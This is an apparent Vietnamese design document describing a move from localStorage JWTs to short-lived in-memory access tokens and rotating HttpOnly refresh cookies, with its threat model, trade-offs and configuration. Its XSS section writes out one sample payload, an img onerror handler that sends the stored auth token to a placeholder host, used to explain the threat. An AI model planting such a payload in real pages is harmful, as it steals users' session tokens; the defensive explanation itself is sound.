# Xác thực: HttpOnly Cookie + Refresh Token

Tài liệu này giải thích cơ chế đăng nhập hiện tại của hệ thống: nó khác gì bản cũ, vì sao
đổi, và những gì nó **không** giải quyết được. Phần cuối nói thẳng về các đánh đổi.

---

## 1. Bản cũ làm gì, và vì sao phải đổi

```
Đăng nhập  ->  server ký một JWT hạn 24 giờ  ->  trả về trong body JSON
           ->  frontend: localStorage.setItem("authToken", token)
           ->  mọi request sau đó: Authorization: Bearer <đọc từ localStorage>
```

Ba vấn đề, xếp theo mức độ nghiêm trọng:

**Token nằm ở nơi mọi đoạn mã trong trang đều đọc được.** `localStorage` không có khái niệm
"chỉ mã của tôi mới được đọc". Mọi script chạy trong trang — kể cả script không phải do nhóm
viết — đều gọi được `localStorage.getItem("authToken")`. Chi tiết ở mục 3.

**Token không thu hồi được.** JWT tự chứng minh tính hợp lệ bằng chữ ký; máy chủ không cần
tra cứu gì, và vì thế cũng không có chỗ nào để đánh dấu "token này không còn dùng được".
Bấm đăng xuất chỉ xoá bản sao trong trình duyệt. Bản sao mà ai đó đã kịp lấy vẫn sống tiếp
đúng tới giây hết hạn của nó.

**Hạn 24 giờ.** Cộng với điều trên, một token bị lộ lúc 9 giờ sáng vẫn mở được tài khoản
đến 9 giờ sáng hôm sau, bất kể nạn nhân làm gì.

---

## 2. Bản hiện tại

Hai loại chìa khoá thay cho một, mỗi loại giữ một việc mà loại kia làm không tốt.

| | Access token | Refresh token |
|---|---|---|
| Dạng | JWT có chữ ký | Chuỗi ngẫu nhiên 256 bit, không mang thông tin |
| Sống ở đâu | Biến trong bộ nhớ tab (`utils/authSession.js`) | Cookie `HttpOnly` |
| JavaScript đọc được? | Được, nhưng chỉ mã trong chính module đó | **Không**, kể cả mã của chính ta |
| Hạn | 15 phút | 14 ngày không hoạt động / trần cứng 60 ngày |
| Máy chủ lưu gì | Không lưu gì | SHA-256 của token, bảng `phien_dang_nhap` |
| Thu hồi được? | Không (hết hạn sau 15 phút) | **Được, ngay lập tức** |
| Dùng ở đâu | Header `Authorization` của mọi request `/api` | Chỉ `/api/auth/refresh` và `/api/auth/logout` |

Luồng đầy đủ:

```
Đăng nhập
   └─> body:      { token: <JWT 15 phút> }      -> giữ trong RAM
   └─> Set-Cookie: vg_refresh=<32 byte>;
                   HttpOnly; Secure; SameSite=Lax; Path=/api/auth; Max-Age=14 ngày

Sau 15 phút (hoặc sau khi F5)
   └─> POST /api/auth/refresh   (trình duyệt tự đính cookie, JS không đụng vào)
   └─> server: kiểm bảng -> thu hồi token cũ -> cấp token mới cho CẢ HAI loại

Đăng xuất
   └─> POST /api/auth/logout -> thu hồi trong CSDL -> xoá cookie
```

Ba bất biến của bảng `phien_dang_nhap` (chi tiết trong `RefreshToken.java`):

1. **Không bao giờ lưu token thô** — chỉ lưu SHA-256. Đọc trộm được cả CSDL cũng không dựng
   ngược ra chuỗi để đem đi dùng.
2. **Một token chỉ dùng được đúng một lần** (xoay vòng). Token bị đánh cắp có tuổi thọ tối đa
   bằng khoảng cách giữa hai lần nạn nhân làm mới phiên, không phải trọn 14 ngày.
3. **Token đã thu hồi mà quay lại = có trộm.** Máy chủ không phân biệt được ai là chủ, nên
   thu hồi cả họ và bắt cả hai bên đăng nhập lại.

---

## 3. Tấn công XSS diễn ra như thế nào

XSS (Cross-Site Scripting) là việc kẻ tấn công khiến trình duyệt của nạn nhân **chạy mã
JavaScript của hắn trong ngữ cảnh trang web của ta**. Khi đã chạy được, đoạn mã đó có mọi
quyền mà mã hợp lệ có: đọc DOM, gọi API kèm phiên đăng nhập, và đọc `localStorage`.

Ba đường vào thường gặp với một ứng dụng như thế này:

**Qua dữ liệu người dùng nhập.** Ai đó đặt tên hành khách là
`<img src=x onerror="fetch('https://kho-cua-toi/?t='+localStorage.authToken)">`. React tự
thoát chuỗi khi render nên đường này đã đóng sẵn — trừ đúng một ngoại lệ:
`dangerouslySetInnerHTML`. Một chỗ duy nhất dùng nó cho dữ liệu chưa lọc là đủ.

**Qua thư viện.** `node_modules` của dự án này có hàng nghìn gói. Chỉ cần một gói bị chiếm
tài khoản npm và phát hành bản vá độc là mã của kẻ tấn công chạy trong bundle, không cần
lừa ai nhập gì cả. Đây là đường không phòng được bằng cách viết code cẩn thận, và là lý do
chính khiến "đừng để bí mật ở chỗ ai cũng đọc được" quan trọng hơn "hãy viết code không có
lỗi XSS".

**Qua nội dung bên thứ ba** nhúng vào trang (quảng cáo, widget, script phân tích).

Điều **đã thay đổi**: kịch bản "một dòng script lấy token rồi gửi về máy chủ của kẻ tấn
công" không còn chạy được. Refresh token nằm trong cookie `HttpOnly` — `document.cookie`
không nhìn thấy nó, `fetch` không đọc được nó, không có API nào của trình duyệt trả nó ra
cho JavaScript. Access token thì nằm trong một biến module, không có khoá nào để tra.

Điều **chưa thay đổi, và phải nói rõ**: mã độc đã chạy được trong trang vẫn **gọi API thay
mặt nạn nhân** được — nó chỉ cần gọi `fetch('/api/bookings')` và trình duyệt tự đính kèm
mọi thứ cần thiết, hệt như khi chính người dùng bấm nút. Nó cũng gọi được `/api/auth/refresh`
để tự gia hạn chừng nào tab còn mở.

Nên khác biệt thật nằm ở phạm vi và thời gian, không phải ở chỗ "chặn được XSS":

| | Trước | Sau |
|---|---|---|
| Mang chìa khoá ra khỏi trình duyệt | Được | Không |
| Dùng lại từ máy của kẻ tấn công | Được, suốt 24 giờ | Không |
| Tấn công tiếp tục sau khi nạn nhân đóng tab | Được | Không |
| Hành động thay mặt nạn nhân khi tab còn mở | Được | **Vẫn được** |
| Nạn nhân cắt được khi phát hiện | Không | Được (đăng xuất / đổi mật khẩu thu hồi ngay) |

Nói gọn: XSS chuyển từ **chiếm tài khoản lâu dài** xuống thành **chiếm phiên tạm thời trong
lúc nạn nhân đang mở trang**. Đó là một bậc thiệt hại, không phải một lá chắn.

Việc cần làm để chặn XSS ngay từ đầu — lọc đầu vào, không dùng `dangerouslySetInnerHTML`
với dữ liệu chưa lọc, thêm `Content-Security-Policy` — vẫn nguyên đó và không nằm trong
phạm vi thay đổi này.

---

## 4. Xong việc này thì các loại tấn công khác đỡ được gì

**Đánh cắp token (mọi nguồn, không riêng XSS) — đỡ nhiều.**
Token rò qua log, qua lịch sử trình duyệt trên máy dùng chung, qua ảnh chụp màn hình DevTools,
hay qua một bản sao lưu `localStorage`: trước đây mỗi trường hợp là một tài khoản bị mở trong
24 giờ. Giờ access token chết sau 15 phút và không tồn tại qua một lần tải trang, còn refresh
token thì không có đường nào rò ra ngoài cookie.

**Phát lại token (replay) — phát hiện được, trước đây thì không.**
Xoay vòng cộng với việc bắt dùng lại token cũ khiến một bản sao bị đánh cắp gần như chắc chắn
va vào bẫy ở lần làm mới kế tiếp của một trong hai bên. Trước đây một JWT bị sao chép dùng
song song với chủ thật mà không để lại dấu vết nào.

**Chiếm tài khoản sau khi lộ mật khẩu — đỡ nhiều.**
`resetPassword` và màn đổi mật khẩu trong tài khoản nay thu hồi phiên: đổi mật khẩu đuổi được
kẻ đang ở trong nhà, việc mà trước đây nó không làm được (refresh token là chuỗi độc lập, nó
không biết gì về mật khẩu).

**Tài khoản bị quản trị viên khoá — bịt nốt lỗ còn lại.**
`JwtAuthFilter` vốn đã kiểm `isEnabled` ở mỗi request. Nay `AdminService.toggleUserStatus`
thu hồi luôn phiên, nên cookie của người bị khoá không nằm chờ sẵn để sống dậy khi được mở
khoá — quan trọng đúng trong tình huống khoá vì nghi tài khoản bị chiếm.

**CSRF — không đỡ, nhưng cũng không tệ đi.**
Hệ thống vẫn xác thực bằng header `Authorization` chứ không bằng cookie, mà header thì trang
web khác không tự đính vào request được. Cookie mới là bề mặt CSRF *duy nhất*, và nó được
che ba lớp: `SameSite=Lax` (trình duyệt không gửi cookie kèm POST từ site khác), phương thức
POST (Lax chỉ nới cho điều hướng GET), và kết quả nằm trong body mà CORS không cho trang
khác đọc. Kể cả khi một request lọt qua, kẻ tấn công chỉ làm token của nạn nhân xoay một
vòng chứ không lấy được gì.

**Nghe lén đường truyền (MITM) — không đỡ.** HTTPS lo việc đó. Cờ `Secure` chỉ bảo đảm
cookie không bao giờ đi qua kênh không mã hoá.

**Dò mật khẩu, dò email, SQL injection, chiếm quyền theo vai trò — không liên quan.**
Những phần đó do rate limiting, thông điệp lỗi đồng nhất, JPA tham số hoá và
`SecurityConfig` đảm nhiệm, không đổi gì trong lần này.

---

## 5. Đánh đổi

**Thêm một request mỗi 15 phút, và một request mỗi lần mở trang.**
Trên Render gói free, container ngủ sau ~15 phút không có lưu lượng, nên một lượt `/refresh`
rơi trúng lúc nó vừa ngủ là 30–60 giây chờ. Đã giảm nhẹ bằng hai cách: làm mới **trước** hạn
60 giây khi trang đang rảnh, và chỉ gọi `/refresh` lúc mở trang khi có dấu hiệu máy này từng
đăng nhập (`localStorage.authUser` — một dấu hiệu, không phải chứng chỉ; sửa tay nó không
cho ai thêm quyền gì).

**Trạng thái đăng nhập không còn biết ngay lập tức.**
Trước đây `localStorage` có token là biết ngay. Giờ phải hỏi máy chủ, nên có một khoảng ngắn
"chưa biết" sau khi mở trang — đó là lý do context có cờ `authReady`, và là lý do màn hình
nào quyết định dựa trên `isAuthenticated` cũng phải đợi cờ đó. Bỏ qua nó thì người đang đăng
nhập sẽ thấy màn hình "vui lòng đăng nhập" chớp qua rồi tự sửa lại.

Đây cũng chính là **cái được** đội lốt cái mất: quyết định "phiên này còn hiệu lực không"
chuyển từ trình duyệt sang máy chủ. Tài khoản vừa bị khoá, phiên vừa bị thu hồi, token vừa
bị phát hiện dùng lại — tất cả chặn được ngay tại đó, việc mà một token nằm sẵn trong
`localStorage` không bao giờ làm được.

**Máy chủ phải giữ trạng thái.** Thêm một bảng, một lượt truy vấn cho mỗi lần làm mới, và
một job dọn dẹp lúc 4h05 sáng. Đây là cái giá của khả năng thu hồi; không có cách nào vừa
thu hồi được vừa hoàn toàn không trạng thái.

**Cửa sổ tha thứ vài giây cho việc dùng lại token.**
Nhiều tab cùng gọi `/refresh` là chuyện thật và thường xuyên. Nếu coi mọi lần dùng lại là
trộm, người dùng bị đăng xuất vì mạng chập chờn. Hiện tại 10 giây đầu sau khi xoay được coi
là thử lại hợp lệ — đổi lại, kẻ trộm phát lại token **trúng** vào cửa sổ đó sẽ không bị phát
hiện. Đặt `JWT_REFRESH_REUSE_GRACE_SECONDS=0` để bỏ hẳn đường giữa này.
Frontend cũng tự gộp các lần làm mới trùng nhau, nên cửa sổ này là lưới an toàn thứ hai chứ
không phải cơ chế chính.

**Phát hiện trộm thì cả nạn nhân cũng bị đăng xuất.** Không tránh được: máy chủ không có cách
nào biết trong hai bên ai là chủ. Chọn đăng xuất cả hai vì phiền một lần vẫn hơn là để kẻ
trộm ở lại.

---

## 6. Cấu hình

| Biến môi trường | Mặc định | Ý nghĩa |
|---|---|---|
| `JWT_EXPIRATION` | `900000` (15 phút) | Hạn access token, mili-giây. Chính là cửa sổ thiệt hại khi token bị lộ. |
| `JWT_REFRESH_IDLE_DAYS` | `14` | Không hoạt động bao lâu thì phiên chết. Mỗi lần làm mới gia hạn lại từ đầu. |
| `JWT_REFRESH_ABSOLUTE_DAYS` | `60` | Trần cứng tính từ lúc đăng nhập. Chặn phiên sống mãi nhờ xoay liên tục. |
| `JWT_REFRESH_REUSE_GRACE_SECONDS` | `10` | Cửa sổ tha thứ khi dùng lại token vừa xoay. 0 = nghiêm ngặt tuyệt đối. |
| `JWT_REFRESH_CLEANUP_CRON` | `0 5 4 * * *` | Lịch dọn phiên đã chết hẳn. |
| `AUTH_REFRESH_COOKIE_SECURE` | `auto` | `auto` suy ra từ scheme thật (`X-Forwarded-Proto` khi sau proxy). Ép `true` trên môi trường http sẽ khiến trình duyệt **lặng lẽ** vứt cookie đi. |
| `AUTH_REFRESH_COOKIE_SAME_SITE` | `Lax` | Đúng cho kiến trúc hiện tại (frontend gọi `/api` qua rewrite của Vercel / Nginx nên cùng site). |

**Cảnh báo về `SameSite=None`.** Chỉ đổi khi frontend gọi **thẳng** sang tên miền backend.
Lúc đó `None` bắt buộc đi kèm `Secure`, và lá chắn CSRF của cookie biến mất — phải bù bằng
double-submit token hoặc một header bắt buộc. Đừng đổi giá trị này rồi bỏ đó.

---

## 7. Bản đồ mã nguồn

**Backend**

| File | Vai trò |
|---|---|
| `entity/RefreshToken.java` | Bảng `phien_dang_nhap` và ba bất biến của nó |
| `service/RefreshTokenService.java` | Cấp, xoay vòng, phát hiện dùng lại, thu hồi, dọn dẹp |
| `service/RefreshTokenRevoker.java` | Thu hồi trong giao dịch riêng — đọc phần đầu file, đó là một cái bẫy thật |
| `security/RefreshCookieFactory.java` | Dựng/xoá cookie, quyết định cờ `Secure` |
| `controller/AuthController.java` | `/refresh`, `/logout`, `/revoke-other-sessions` |
| `exception/InvalidRefreshTokenException.java` | 401 + mã `REFRESH_TOKEN_INVALID`, cố tình không nói lý do cụ thể |

**Frontend**

| File | Vai trò |
|---|---|
| `utils/authSession.js` | Kho token trong bộ nhớ, gộp lần làm mới, bộ chặn fetch + axios |
| `context/AuthContext.jsx` | Khôi phục phiên lúc mở trang, làm mới trước hạn, `authReady` |

**Kiểm thử**

| File | Phủ cái gì |
|---|---|
| `RefreshTokenRotationIntegrationTest.java` | Ba bất biến, hết hạn, trần cứng, thu hồi từng loại |
| `authSession.test.js` | Gắn token, gộp lần làm mới, 401 → làm mới → gửi lại, không đụng API ngoài |

---

## 8. Việc còn lại

Những thứ **không** nằm trong thay đổi này, xếp theo giá trị trên công sức:

1. **`Content-Security-Policy`.** Đây là thứ tấn công thẳng vào gốc XSS thay vì giảm nhẹ hậu
   quả như tài liệu này. Chưa làm vì phải rà toàn bộ script và style nội tuyến hiện có.
2. **Màn "Thiết bị đang đăng nhập".** Dữ liệu đã có đủ trong bảng (`family_id`, `user_agent`,
   `last_used_at`); chỉ thiếu endpoint liệt kê và giao diện.
3. **Cảnh báo qua email khi phát hiện dùng lại token.** Hiện chỉ ghi log ở mức `warn`, mà log
   trên Render free tier thì mất khi container restart.
4. **Ràng buộc phiên theo thiết bị.** Cột `user_agent` cố tình **không** được dùng làm điều
   kiện xác thực: kẻ trộm sao chép được nó, còn người thật thì đổi nó sau mỗi lần cập nhật
   trình duyệt. Làm đúng việc này cần token binding thật, không phải so chuỗi.
